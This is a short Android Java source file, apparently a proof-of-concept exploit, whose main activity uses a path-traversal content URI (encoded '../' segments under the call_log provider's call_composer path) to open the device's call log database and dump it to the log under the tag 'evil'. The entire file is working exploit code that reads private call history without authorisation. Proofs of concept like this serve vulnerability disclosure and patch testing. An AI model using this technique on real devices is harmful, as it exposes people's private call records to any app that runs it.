package poc.app;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.IOUtils;

import java.io.InputStream;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://call_log/call_composer/..%2F..%2Fdatabases%2Fcalllog.db");
        try (InputStream i = getContentResolver().openInputStream(uri)) {
            Log.d("evil", IOUtils.toString(i));
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}